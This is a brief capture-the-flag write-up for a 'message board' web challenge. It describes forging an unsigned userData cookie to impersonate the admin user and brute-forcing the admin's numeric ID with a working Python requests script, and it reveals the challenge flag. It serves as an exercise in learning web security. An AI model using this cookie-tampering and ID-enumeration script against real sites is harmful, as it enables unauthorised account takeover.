
The challenge gave account for user *kupatergent* to login message board, from the code, it seems user *admin* can bring us the flag. The ID for admin is unkown, the user ID is a number, bruteforce seems like an option. 

Login as *kupatergent*, replace user ID in cookie with testing number, if the number is admin ID, the flag shall be in response. 

```python
def exploit():
    target = 'https://message-board.hsc.tf'
    user = 'kupatergent'
    pw = 'gandal'
    with requests.Session() as sess:
        rsp = sess.post(target+'/login', data={'username':user,'password':pw})
        user_data = sess.cookies.get_dict()['userData']
        user_data = user_data.replace(user, 'admin')
        for admin_id in range(10000):
            fake = user_data.replace('972', str(admin_id))
            sess.cookies.set('userData', fake, domain=target.split('/')[-1])
            rsp = sess.get(target)
            print(sess.cookies)
            if 'flag{' in rsp.text:
                print(rsp.text)
                break
```

The script ran for a while quite when number reach *768*, so it's the admin ID, the flag is *flag{y4m_y4m_c00k13s}*.
